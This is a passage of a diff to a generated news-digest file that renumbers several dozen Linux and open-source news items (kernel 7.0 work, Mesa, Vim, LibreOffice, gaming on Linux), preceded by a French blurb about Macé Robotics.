 Macé Robotics est une entreprise individuelle fondée et gérée par moi-même (Nicolas), basée en Bretagne, spécialisée dans la conception et la réparation électronique, aussi bien pour les entreprises que pour les particuliers. Depuis 2016, je fabrique aussi du matériel Open Source également des robots mobiles Open Source destinés à l’enseignement supérieur et à la recherche. Ces robots sont basés sur un système Linux (Raspberry Pi OS), intégrant une carte Raspberry Pi ainsi qu’un microcontrôleur (Pico) dédié à la gestion des moteurs et des capteurs. J’utilise la suite logicielle KiCad sous licence GNU GPL (https://www.kicad.org/) pour la conception des circuits imprimés de ces robots. Attribution des lots par tirage au sort :
@@ -6642,7 +6677,7 @@ Télécharger ce contenu au format EPUB : voir le flux Atom ouvrir dans le navig
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="OMG! Ubuntu">
 
-### 13. `EN` [Ubuntu 24.04.4 LTS released with Linux 6.17 + Mesa 25.2](data/articles/037061f2ea3675dc122d5f8fc7284b7d.html)
+### 14. `EN` [Ubuntu 24.04.4 LTS released with Linux 6.17 + Mesa 25.2](data/articles/037061f2ea3675dc122d5f8fc7284b7d.html)
 **Source:** OMG! Ubuntu | **Keyword:** `Linux`
 Ubuntu 24.04.4 LTS is now available to download. This fourth point release brings the Linux 6.17 HWE kernel and Mesa 25.2 graphics stack for better hardware support.
 You're reading Ubuntu 24.04.4 LTS released with Linux 6.17 + Mesa 25.2, a blog post from OMG! Ubuntu. Do not reproduce elsewhere without permission.
@@ -6651,7 +6686,7 @@ You're reading Ubuntu 24.04.4 LTS released with Linux 6.17 + Mesa 25.2, a blog p
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 14. `EN` [Buckshot Roulette dev becomes a major Godot Engine donor](data/articles/e3b71a03cdcf7110326faa3e3dbefcfb.html)
+### 15. `EN` [Buckshot Roulette dev becomes a major Godot Engine donor](data/articles/e3b71a03cdcf7110326faa3e3dbefcfb.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 The Godot team announced that Mike Klubnika, the developer of Buckshot Roulette and s.p.l.i.t, has become a major funding donor for the open source game engine. Read the full article on GamingOnLinux.
 
@@ -6659,7 +6694,7 @@ The Godot team announced that Mike Klubnika, the developer of Buckshot Roulette 
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 15. `EN` [Mesa 26.0 is out bringing ray tracing performance improvements for AMD RADV](data/articles/6ad10ef8138fd57bf8e0c9160814b473.html)
+### 16. `EN` [Mesa 26.0 is out bringing ray tracing performance improvements for AMD RADV](data/articles/6ad10ef8138fd57bf8e0c9160814b473.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 Mesa 26.0 has arrived as the latest new-feature release of open source graphics drivers, and there's a whole lot to be excited about in this one. Read the full article on GamingOnLinux.
 
@@ -6667,7 +6702,7 @@ Mesa 26.0 has arrived as the latest new-feature release of open source graphics 
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 16. `EN` [Minecraft Java is switching from OpenGL to Vulkan for the Vibrant Visuals update](data/articles/1c3de9f60e3c7a128c81bc68e85c9ffe.html)
+### 17. `EN` [Minecraft Java is switching from OpenGL to Vulkan for the Vibrant Visuals update](data/articles/1c3de9f60e3c7a128c81bc68e85c9ffe.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 Work continues for the Vibrant Visuals update to come to Minecraft Java, and as part of that they're switching the rendering from OpenGL to Vulkan. Read the full article on GamingOnLinux.
 
@@ -6675,7 +6710,7 @@ Work continues for the Vibrant Visuals update to come to Minecraft Java, and as 
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 17. `EN` [Godot Engine suffering from lots of "AI slop" code submissions](data/articles/54cacaab7ae19bef79f20712e98db5c4.html)
+### 18. `EN` [Godot Engine suffering from lots of "AI slop" code submissions](data/articles/54cacaab7ae19bef79f20712e98db5c4.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 The Godot Engine team recently posted about more issues with "AI slop", including various pull requests that have become a big drain on resources. Read the full article on GamingOnLinux.
 
@@ -6683,7 +6718,7 @@ The Godot Engine team recently posted about more issues with "AI slop", includin
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="Phoronix">
 
-### 18. `EN` [Apple M3 With Asahi Linux Continues Making Progress, No ETA Yet For Shipping](data/articles/afb7b1cbdf79870e6ec1426f955df20a.html)
+### 19. `EN` [Apple M3 With Asahi Linux Continues Making Progress, No ETA Yet For Shipping](data/articles/afb7b1cbdf79870e6ec1426f955df20a.html)
 **Source:** Phoronix | **Keyword:** `Benchmarks`
 Asahi Linux developers have published a status report following the recent Linux 6.19 kernel release to outline recent progress and upcoming items around Apple Silicon support on Linux. This year will also mark five years that Asahi Linux has been around for bringing Linux to the Apple M-Series hardware...
 
@@ -6691,7 +6726,7 @@ Asahi Linux developers have published a status report following the recent Linux
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="Phoronix">
 
-### 19. `EN` [KVM In Linux 7.0 Adds Support For Virtualizing AMD ERAPS](data/articles/473f8b3ccb25057d107a60d244a0d67a.html)
+### 20. `EN` [KVM In Linux 7.0 Adds Support For Virtualizing AMD ERAPS](data/articles/473f8b3ccb25057d107a60d244a0d67a.html)
 **Source:** Phoronix | **Keyword:** `Benchmarks`
 All of the KVM virtualization feature changes were recently merged for the in-development Linux 7.0 kernel...
 
@@ -6699,7 +6734,7 @@ All of the KVM virtualization feature changes were recently merged for the in-de
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="Phoronix">
 
-### 20. `EN` [Linux 7.0 Merges "Significant Improvement" For close_range System Call](data/articles/1079b8297ec61ff788e1331da31045d7.html)
+### 21. `EN` [Linux 7.0 Merges "Significant Improvement" For close_range System Call](data/articles/1079b8297ec61ff788e1331da31045d7.html)
 **Source:** Phoronix | **Keyword:** `Benchmarks`
 The close_range system call for closing all file descriptors "FDs" in a given range should enjoy a nice speed boost with the in-development Linux 7.0 kernel...
 
@@ -6707,7 +6742,7 @@ The close_range system call for closing all file descriptors "FDs" in a given ra
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="LWN.net">
 
-### 21. `EN` [[$] Do androids dream of accepted pull requests?](data/articles/c1f8c8660e37274e39e9313d97dad543.html)
+### 22. `EN` [[$] Do androids dream of accepted pull requests?](data/articles/c1f8c8660e37274e39e9313d97dad543.html)
 **Source:** LWN.net | **Keyword:** `Development`
 Various forms of tools, colloquially known as "AI", have been
 rapidly pervading all aspects of open-source development. Many
@@ -6723,7 +6758,7 @@ recently after a project rejected a bot-driven pull request.
 
 <div class="article-item" data-lang="fr" data-category="linux" data-source="Journal du Hacker">
 
-### 22. `FR` [Vim 9.2 est là : plus moderne et plus propre](data/articles/3d31198dbb5c2b5343c058b61635ba1b.html)
+### 23. `FR` [Vim 9.2 est là : plus moderne et plus propre](data/articles/3d31198dbb5c2b5343c058b61635ba1b.html)
 **Source:** Journal du Hacker | **Keyword:** `Hacking`
 34 ans après sa première version, Vim prouve qu’il reste un pilier incontournable de l’écosystème open source. Le projet a publié le vendredi 13 février 2026 la version 9.2 de son célèbre éditeur de texte. Il s’agit de la première mise à jour majeure depuis janvier 2024, marquant une étape importante dans la continuité du projet après le décès de son créateur Bram Moolenaar en 2023. Cette version n’est pas qu’une simple correction de bugs, car elle apporte des fonctionnalités de modernité réclamées de longue date par la communauté. Tour d’horizon !
 Un support natif de Wayland et des dossiers plus propres
@@ -6736,7 +6771,7 @@ Le langage de script interne, Vim9 Script, continue son év
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 23. `EN` [Rocket League is adding Easy Anti-Cheat, Psyonix say Linux will still be supported with Proton](data/articles/864550f5cce6dd32aca0f69025b13ecb.html)
+### 24. `EN` [Rocket League is adding Easy Anti-Cheat, Psyonix say Linux will still be supported with Proton](data/articles/864550f5cce6dd32aca0f69025b13ecb.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 Rocket League is set to get Easy Anti-Cheat in April, as the Epic Games owned studio Psyonix just recently announced. Read the full article on GamingOnLinux.
 
@@ -6744,7 +6779,7 @@ Rocket League is set to get Easy Anti-Cheat in April, as the Epic Games owned st
 
 <div class="article-item" data-lang="fr" data-category="linux" data-source="LinuxFr">
 
-### 24. `FR` [Parcours libriste d’Isabella Vanni — « Libre à vous ! » du 10 février 2026 — Podcasts et références](data/articles/22e17fe8f975d8b14b500193845288b4.html)
+### 25. `FR` [Parcours libriste d’Isabella Vanni — « Libre à vous ! » du 10 février 2026 — Podcasts et références](data/articles/22e17fe8f975d8b14b500193845288b4.html)
 **Source:** LinuxFr | **Keyword:** `France`
 268ème émission « Libre à vous ! » de l’April. Podcast et programme :
 sujet principal : parcours libriste d’Isabella Vanni, coordinatrice vie associative et responsable projets à l’April. Un parcours libriste est l’interview d’une seule personne pour parler de son parcours personnel et professionnel
@@ -6761,7 +6796,7 @@ lien nᵒ 6 : Radio Cause Commune Rendez‐vous en direct chaque mardi de 15 
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="Phoronix">
 
-### 25. `EN` [Linux 7.0 CXL Enables AMD Zen 5 Address Translation Feature](data/articles/ff9165f42eaaaed26b5ccadafd5fd783.html)
+### 26. `EN` [Linux 7.0 CXL Enables AMD Zen 5 Address Translation Feature](data/articles/ff9165f42eaaaed26b5ccadafd5fd783.html)
 **Source:** Phoronix | **Keyword:** `Benchmarks`
 A long-in-development feature for AMD EPYC Zen 5 server platforms now merged for the Linux 7.0 kernel is ACPI PRMT-based address translation for the Compute Express Link (CXL) subsystem...
 
@@ -6769,7 +6804,7 @@ A long-in-development feature for AMD EPYC Zen 5 server platforms now merged for
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="Phoronix">
 
-### 26. `EN` [Lutris 0.5.20 Linux Game Manager Brings New Features, Wine Wayland Option](data/articles/8f6fd5d0b990e2673f6c16cb3624caba.html)
+### 27. `EN` [Lutris 0.5.20 Linux Game Manager Brings New Features, Wine Wayland Option](data/articles/8f6fd5d0b990e2673f6c16cb3624caba.html)
 **Source:** Phoronix | **Keyword:** `Benchmarks`
 For fans of Lutris as the open-source desktop client for installing and playing many games on Linux, Lutris 0.5.20 is out today with new features that further enhance the integration with different emulators and compatibility layers...
 
@@ -6777,7 +6812,7 @@ For fans of Lutris as the open-source desktop client for installing and playing 
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 27. `EN` [GE-Proton 10-31 brings fixes for Arknights: Endfield, Duet Night Abyss and more](data/articles/73e1c4a1fdde13a9eafd686ffadb96f6.html)
+### 28. `EN` [GE-Proton 10-31 brings fixes for Arknights: Endfield, Duet Night Abyss and more](data/articles/73e1c4a1fdde13a9eafd686ffadb96f6.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 GE-Proton 10-31 is another fresh released of the compatibility layer to run more games on Linux / SteamOS, with more game fixes available. Read the full article on GamingOnLinux.
 
@@ -6785,7 +6820,7 @@ GE-Proton 10-31 is another fresh released of the compatibility layer to run more
 
 <div class="article-item" data-lang="fr" data-category="linux" data-source="Journal du Hacker">
 
-### 28. `FR` [Liens intéressants Journal du hacker semaine #7](data/articles/10f8e02d6a528e98fa222eb292a5dd19.html)
+### 29. `FR` [Liens intéressants Journal du hacker semaine #7](data/articles/10f8e02d6a528e98fa222eb292a5dd19.html)
 **Source:** Journal du Hacker | **Keyword:** `Hacking`
 Rédigé par Cascador - 16 février 2026 - Aucun Pour la 7ème semaine de l'année 2026, voici 10 liens intéressants que vous avez peut-être ratés, relayés par le Journal du hacker, votre source d’informations pour le Logiciel Libre francophone ! 101 façons de déployer Kubernetes : une nouvelle UI pour explorer les 118+ solutions
 Quoi de neuf les devs? #165 - Veille tech et l'interview de Korben
@@ -6804,7 +6839,7 @@ Le compte Mastodon du Journal du hacker De plus le site web du Journal du hacker
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 29. `EN` [You can now add hardware details to Steam reviews, and give more feedback on Steam Deck Verified](data/articles/fc9df82b18b5df859865dd05114428b7.html)
+### 30. `EN` [You can now add hardware details to Steam reviews, and give more feedback on Steam Deck Verified](data/articles/fc9df82b18b5df859865dd05114428b7.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 You can now add hardware details to Steam reviews, and give more feedback on Steam Deck Verified
 
@@ -6812,7 +6847,7 @@ You can now add hardware details to Steam reviews, and give more feedback on Ste
 
 <div class="article-item" data-lang="fr" data-category="linux" data-source="LinuxFr">
 
-### 30. `FR` [LibreOffice 26.2 : Markdown, accessibilité et plein d’autres nouveautés et améliorations](data/articles/4a3f163314f7c85cbeb59ed3f13797b0.html)
+### 31. `FR` [LibreOffice 26.2 : Markdown, accessibilité et plein d’autres nouveautés et améliorations](data/articles/4a3f163314f7c85cbeb59ed3f13797b0.html)
 **Source:** LinuxFr | **Keyword:** `France`
 En février, il y a la corvée commerciale de la Saint-Valentin et les réjouissances intellectuelles consécutives à la sortie d’une nouvelle version de la suite bureautique LibreOffice. C’est, bien évidemment, sur LibreOffice 26.2 que l’on va se pencher. Au menu, du très visible, comme les boites de dialogues, du très attendu comme la prise en compte du Markdown ou du moins visible comme le travail sur l’accessibilité.
 Il va de soi que les notes de version sont plus exhaustives et qu’il ne s’agit ici que d’une sélection. lien nᵒ 1 : Notes de version Sommaire
@@ -6873,7 +6908,7 @@ The Document Foundation ou TDF est la fondation de droit allemand qui pilote le 
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="Its FOSS">
 
-### 31. `EN` [FOSS Weekly #26.07: Kernel 6.19, AI for Real Sysadmin Works, Arch Apps on Ubuntu and More Linux Stuff](data/articles/9d8538cd246d094c263fda997421c98a.html)
+### 32. `EN` [FOSS Weekly #26.07: Kernel 6.19, AI for Real Sysadmin Works, Arch Apps on Ubuntu and More Linux Stuff](data/articles/9d8538cd246d094c263fda997421c98a.html)
 **Source:** Its FOSS | **Keyword:** `Linux`
 The last kernel of the 6.x series is here.
 
@@ -6881,7 +6916,7 @@ The last kernel of the 6.x series is here.
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 32. `EN` [Linux Mint may slow down releases to have more development time](data/articles/72ef78a7d0e41e540eae11dc5f0a2ee2.html)
+### 33. `EN` [Linux Mint may slow down releases to have more development time](data/articles/72ef78a7d0e41e540eae11dc5f0a2ee2.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 Along with receiving an unprecedented amount of donations recently, the Linux Mint team are looking at slowing down their release cycle. Read the full article on GamingOnLinux.
 
@@ -6889,7 +6924,7 @@ Along with receiving an unprecedented amount of donations recently, the Linux Mi
 
 <div class="article-item" data-lang="fr" data-category="linux" data-source="LinuxFr">
 
-### 33. `FR` [Les journaux LinuxFr.org les mieux notés de janvier 2026](data/articles/bea148a7cf5ddc0a595ea531cc33745d.html)
+### 34. `FR` [Les journaux LinuxFr.org les mieux notés de janvier 2026](data/articles/bea148a7cf5ddc0a595ea531cc33745d.html)
 **Source:** LinuxFr | **Keyword:** `France`
 LinuxFr.org propose des dépêches et articles, soumis par tout un chacun, puis revus et corrigés par l’équipe de modération avant publication. C’est la partie la plus visible de LinuxFr.org, ce sont les dépêches qui sont le plus lues et suivies, sur le site, via Atom/RSS, ou bien via partage par messagerie instantanée, par courriel, ou encore via médias sociaux. Ce que l’on sait moins, c’est que LinuxFr.org vous propose également de publier directement vos propres articles, sans validation a priori de lʼéquipe de modération. Ceux-ci s’appellent des journaux. Voici un florilège d’une dizaine de ces journaux parmi les mieux notés par les utilisateurs et les utilisatrices… qui notent. Lumière sur ceux du mois de janvier passé.
 « lecteur mp3 pour personne handicapée mentale » par ChocolatineFlying ;
@@ -6909,7 +6944,7 @@ lien nᵒ 3 : Proposez une dépêche Télécharger ce contenu au format EPUB : 
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="OMG! Ubuntu">
 
-### 34. `EN` [Linux 6.19: 40% Speed Boost on Old AMD GPUs &amp; Faster Ext4](data/articles/9c2e37748130ef13f2b24aec7a3ec609.html)
+### 35. `EN` [Linux 6.19: 40% Speed Boost on Old AMD GPUs &amp; Faster Ext4](data/articles/9c2e37748130ef13f2b24aec7a3ec609.html)
 **Source:** OMG! Ubuntu | **Keyword:** `Linux`
 Linux 6.19 brings native Vulkan support to older AMD Radeon GPUs, hardware-accelerated HDR via the DRM Colour Pipeline API and ext4 speed boosts.
 You're reading Linux 6.19: 40% Speed Boost on Old AMD GPUs &amp; Faster Ext4, a blog post from OMG! Ubuntu. Do not reproduce elsewhere without permission.
@@ -6918,7 +6953,7 @@ You're reading Linux 6.19: 40% Speed Boost on Old AMD GPUs &amp; Faster Ext4, a 
 
 <div class="article-item" data-lang="fr" data-category="linux" data-source="LinuxFr">
 
-### 35. `FR` [Rétablissement de l'« auto-attestation » pour les logiciels de caisse, l'aboutissement d'une année de mobilisation](data/articles/94205d2b52b4c2f91689aa6f73b5cf84.html)
+### 36. `FR` [Rétablissement de l'« auto-attestation » pour les logiciels de caisse, l'aboutissement d'une année de mobilisation](data/articles/94205d2b52b4c2f91689aa6f73b5cf84.html)
 **Source:** LinuxFr | **Keyword:** `France`
 Avec l’adoption du projet de loi de finances pour 2026, les éditeurs de logiciels de caisse ont retrouvé la faculté d’attester eux-mêmes de la conformité de leur solution, un an après que la certification par un organisme tiers avait été rendue obligatoire. Une mesure salutaire pour la pérennité des logiciels libres de caisse.
 La loi de finances pour 2025 avait supprimé la possibilité, pour les éditeurs, d’attester eux-mêmes de la conformité des fonctionnalités d’encaissement de leur logiciel. Ils étaient dès lors tenus de passer par la certification, une procédure lourde et très mal adaptée à la réalité des marchés informatiques et à l’innovation, en particulier pour les logiciels libres. Une réforme actée sans réelle consultation, sans étude d’impact préalable et sans que l’administration fiscale ait exprimé de problème avec le dispositif.
@@ -6937,7 +6972,7 @@ Télécharger ce contenu au format EPUB : voir le flux Atom ouvrir dans le navig
 
 <div class="article-item" data-lang="fr" data-category="linux" data-source="LinuxFr">
 
-### 36. `FR` [L'April propose le pacte du logiciel libre à l'occasion des élections municipales et communautaires de 2026](data/articles/8c467e7848164cc335572d7312ff248f.html)
+### 37. `FR` [L'April propose le pacte du logiciel libre à l'occasion des élections municipales et communautaires de 2026](data/articles/8c467e7848164cc335572d7312ff248f.html)
 **Source:** LinuxFr | **Keyword:** `France`
 À l'occasion des élections municipales et communautaires des 15 et 22 mars 2026, l'April propose aux personnes candidates de signer le Pacte du Logiciel Libre afin de marquer leur engagement, si elles sont élues, à promouvoir et défendre une priorité aux logiciels libres et aux formats ouverts au sein de leurs collectivités.
 Le pacte du logiciel libre est une initiative de l'April qui remonte à l'élection présidentielle de 2007. À l'occasion des élections locales à venir, le pacte a évolué pour être plus représentatif des enjeux actuels.
@@ -6957,7 +6992,7 @@ Télécharger ce contenu au format EPUB : voir le flux Atom ouvrir dans le navig
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="Phoronix">
 
-### 37. `EN` [Linux 7.0 Retires The IBM Mwave ACP Modem Driver Used By Some 1990s ThinkPads](data/articles/abb445e94fd5d61a2a00f0f34fab49d3.html)
+### 38. `EN` [Linux 7.0 Retires The IBM Mwave ACP Modem Driver Used By Some 1990s ThinkPads](data/articles/abb445e94fd5d61a2a00f0f34fab49d3.html)
 **Source:** Phoronix | **Keyword:** `Benchmarks`
 Long past due for retirement, the Linux 7.0 kernel has removed the obsolete Mwave driver for the 3780i ACP Modem found in some Pentium II era IBM ThinkPads from the 1990s...
 
@@ -6965,7 +7000,7 @@ Long past due for retirement, the Linux 7.0 kernel has removed the obsolete Mwav
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="Phoronix">
 
-### 38. `EN` [Intel's Discontinued Open-Source OpenPGL Project Finds A New Home](data/articles/6775a9901672c82066e565b9937e2d7e.html)
+### 39. `EN` [Intel's Discontinued Open-Source OpenPGL Project Finds A New Home](data/articles/6775a9901672c82066e565b9937e2d7e.html)
 **Source:** Phoronix | **Keyword:** `Benchmarks`
 Back in 2022 Intel announced OpenPGL as an open-source library for path guiding to help enhance the quality of path-based renderers. With time Blender began making use of OpenPGL and other industry interest and adoption. Unfortunately, Intel quietly ended work on OpenPGL in 2025 but has now fortunately found a new home...
 
@@ -6973,7 +7008,7 @@ Back in 2022 Intel announced OpenPGL as an open-source library for path guiding 
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="Its FOSS">
 
-### 39. `EN` [Think You're Digitally Sovereign? Red Hat Built a Tool to Find Out](data/articles/b22516c627deb730913eb413894dfb8e.html)
+### 40. `EN` [Think You're Digitally Sovereign? Red Hat Built a Tool to Find Out](data/articles/b22516c627deb730913eb413894dfb8e.html)
 **Source:** Its FOSS | **Keyword:** `Linux`
 It is open source, vendor-neutral, and free to self-host.
 
@@ -6981,7 +7016,7 @@ It is open source, vendor-neutral, and free to self-host.
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="Phoronix">
 
-### 40. `EN` [System76 Preparing To Introduce Redesigned Thelio Hardware](data/articles/d336f5d296da938e89f60adf00b73088.html)
+### 41. `EN` [System76 Preparing To Introduce Redesigned Thelio Hardware](data/articles/d336f5d296da938e89f60adf00b73088.html)
 **Source:** Phoronix | **Keyword:** `Benchmarks`
 Linux hardware vendor System76 has begun teasing a redesign of their Thelio chassis that is used by their modern desktops and workstations. Helping distinguish System76 from other Linux desktop/PC vendors has been their custom-engineered, built-in-the-USA enclosures and now they are preparing to launch a next-generation design...
 
@@ -6989,7 +7024,7 @@ Linux hardware vendor System76 has begun teasing a redesign of their Thelio chas
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="Phoronix">
 
-### 41. `EN` [Linux 7.0 Brings Several Enhancements For Modern Laptops](data/articles/e4b3c26b75d4bc9f909d8af475c1c5ab.html)
+### 42. `EN` [Linux 7.0 Brings Several Enhancements For Modern Laptops](data/articles/e4b3c26b75d4bc9f909d8af475c1c5ab.html)
 **Source:** Phoronix | **Keyword:** `Benchmarks`
 The x86 platform driver updates were merged recently for the ongoing Linux 7.0 merge window. As is a common theme for platform-drivers-x86, a lot of the feature work is around Linux laptop drivers for enhancing the support on modern hardware...
 
@@ -6997,7 +7032,7 @@ The x86 platform driver updates were merged recently for the ongoing Linux 7.0 m
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="LWN.net">
 
-### 42. `EN` [[$] More accurate congestion notification for TCP](data/articles/f5990d5765851152e72b1b9db4584837.html)
+### 43. `EN` [[$] More accurate congestion notification for TCP](data/articles/f5990d5765851152e72b1b9db4584837.html)
 **Source:** LWN.net | **Keyword:** `Development`
 The "More Accurate Explicit Congestion Notification" (AccECN) mechanism is
 defined by this
@@ -7011,7 +7046,7 @@ networks.
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 43. `EN` [Mewgenics is a clear hit reaching over a million sales](data/articles/1a204aa291327f316770cf0bada6a77e.html)
+### 44. `EN` [Mewgenics is a clear hit reaching over a million sales](data/articles/1a204aa291327f316770cf0bada6a77e.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 A little bit of good news - Mewgenics from Edmund McMillen and Tyler Glaiel is a clear hit, with it recently hitting a big sales milestone. Read the full article on GamingOnLinux.
 
@@ -7019,7 +7054,7 @@ A little bit of good news - Mewgenics from Edmund McMillen and Tyler Glaiel is a
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="LWN.net">
 
-### 44. `EN` [Fedora now available in Syria](data/articles/4a04b1f988019bbe708b9bd4869cbaf8.html)
+### 45. `EN` [Fedora now available in Syria](data/articles/4a04b1f988019bbe708b9bd4869cbaf8.html)
 **Source:** LWN.net | **Keyword:** `Development`
 Justin Wheeler writes in Fedora
 Magazine that Fedora is now available in Syria once again:
@@ -7040,7 +7075,7 @@ happen.
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 45. `EN` [Unity CEO says an upcoming Beta will allow people to "prompt full casual games into existence"](data/articles/867ff780bbdd9111335ca134f1429130.html)
+### 46. `EN` [Unity CEO says an upcoming Beta will allow people to "prompt full casual games into existence"](data/articles/867ff780bbdd9111335ca134f1429130.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 The generative AI expansion continues, with the Unity game engine being turned into a slop-making machine with an upcoming update. Read the full article on GamingOnLinux.
 
@@ -7048,7 +7083,7 @@ The generative AI expansion continues, with the Unity game engine being turned i
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="LWN.net">
 
-### 46. `EN` [An Asahi Linux progress report](data/articles/e71b218ca313940ae634820ec5ab652d.html)
+### 47. `EN` [An Asahi Linux progress report](data/articles/e71b218ca313940ae634820ec5ab652d.html)
 **Source:** LWN.net | **Keyword:** `Development`
 The Asahi Linux project, which is working to implement support for Linux on
 Apple CPUs, has published a detailed 6.19
@@ -7058,7 +7093,7 @@ progress report. We've made incredible progress upstreaming patches over the pas
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="Phoronix">
 
-### 47. `EN` [LoongArch Ready With New Features In Linux 7.0](data/articles/c2980cdb5b6805dcaee051adb21daad2.html)
+### 48. `EN` [LoongArch Ready With New Features In Linux 7.0](data/articles/c2980cdb5b6805dcaee051adb21daad2.html)
 **Source:** Phoronix | **Keyword:** `Benchmarks`
 The Linux 7.0 kernel is shipping improvements for LoongArch, the Chinese CPU architecture inspired by MIPS64 and RISC-V and has been showing much potential for their domestic PC manufacturing...
 
@@ -7066,7 +7101,7 @@ The Linux 7.0 kernel is shipping improvements for LoongArch, the Chinese CPU arc
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 48. `EN` [Hytale gets a huge Patch 3 update with Animal Taming, Map Markers and lots of new content](data/articles/7709856fa91b11670f3eab15a387bf4d.html)
+### 49. `EN` [Hytale gets a huge Patch 3 update with Animal Taming, Map Markers and lots of new content](data/articles/7709856fa91b11670f3eab15a387bf4d.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 Hypixel Studios continue building up Hytale during Early Access with Patch 3 out now that adds in a ridiculous amount of additions to the game. Read the full article on GamingOnLinux.
 
@@ -7074,7 +7109,7 @@ Hypixel Studios continue building up Hytale during Early Access with Patch 3 out
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 49. `EN` [Prepare for HDD availability trouble as they're getting sold out too](data/articles/d30536dafbf9aa3d994cd18a519d19ca.html)
+### 50. `EN` [Prepare for HDD availability trouble as they're getting sold out too](data/articles/d30536dafbf9aa3d994cd18a519d19ca.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 Component shortages are increasing thanks to the AI boom, and if you were thinking you could fall back on traditional HDDs - you would be wrong. Read the full article on GamingOnLinux.
 
@@ -7082,7 +7117,7 @@ Component shortages are increasing thanks to the AI boom, and if you were thinki
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="Phoronix">
 
-### 50. `EN` [Intel Lands Initial Preparations For DSA 3.0 Accelerators In Linux 7.0](data/articles/fff5d3f1fb886a0c0cf167bfd792e12f.html)
+### 51. `EN` [Intel Lands Initial Preparations For DSA 3.0 Accelerators In Linux 7.0](data/articles/fff5d3f1fb886a0c0cf167bfd792e12f.html)
 **Source:** Phoronix | **Keyword:** `Benchmarks`
 Last year we began seeing Linux patches preparing the kernel for Intel Data Streaming Accelerator "DSA" 3.0 IP. Finally with the Linux 7.0 kernel those patches in updated form have now been merged...
 
@@ -7090,7 +7125,7 @@ Last year we began seeing Linux patches preparing the kernel for Intel Data Stre
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="GamingOnLinux">
 
-### 51. `EN` [NVIDIA recommended driver 580.126.18 released for Linux](data/articles/dc881a1f97df82cda3185082e0ca0279.html)
+### 52. `EN` [NVIDIA recommended driver 580.126.18 released for Linux](data/articles/dc881a1f97df82cda3185082e0ca0279.html)
 **Source:** GamingOnLinux | **Keyword:** `Gaming`
 NVIDIA released their latest driver for Linux with version 580.126.18 out now. Read the full article on GamingOnLinux.
 
@@ -7098,7 +7133,7 @@ NVIDIA released their latest driver for Linux with version 580.126.18 out now. R
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="Its FOSS">
 
-### 52. `EN` [8 Years Later, Linux-based AsteroidOS 2.0 is Here to Add New Life to Your Old Smartwatch](data/articles/db00b9192604bc9e01b6bd82273aff7f.html)
+### 53. `EN` [8 Years Later, Linux-based AsteroidOS 2.0 is Here to Add New Life to Your Old Smartwatch](data/articles/db00b9192604bc9e01b6bd82273aff7f.html)
 **Source:** Its FOSS | **Keyword:** `Linux`
 The AsteroidOS 2.0 release aims to provide a stable, beautiful base for people who want an open smartwatch today, and an interesting project for developers who want to experiment, learn and contribute.
 
@@ -7106,7 +7141,7 @@ The AsteroidOS 2.0 release aims to provide a stable, beautiful base for people w
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="Phoronix">
 
-### 53. `EN` [NTFS3 Driver Sees Improvements In Linux 7.0 While "NTFS Remake" Driver Bakes](data/articles/fe3325399ee2b6b3b7133db29ccab097.html)
+### 54. `EN` [NTFS3 Driver Sees Improvements In Linux 7.0 While "NTFS Remake" Driver Bakes](data/articles/fe3325399ee2b6b3b7133db29ccab097.html)
 **Source:** Phoronix | **Keyword:** `Benchmarks`
 The NTFS3 driver maintained by Paragon Software for Microsoft NTFS file-systems today saw a batch of improvements merged for Linux 7.0 This comes as there is also the competing "NTFS Remake" driver that began a few months ago as the "NTFSPLUS" driver. That NTFS Remake driver isn't looking like it will be submitted for the Linux 7.0 merge window so at least for now the NTFS3 driver continues seeing improvements with the latest mainline kernel code...
 
@@ -7114,7 +7149,7 @@ The NTFS3 driver maintained by Paragon Software for Microsoft NTFS file-systems 
 
 <div class="article-item" data-lang="en" data-category="linux" data-source="Phoronix">
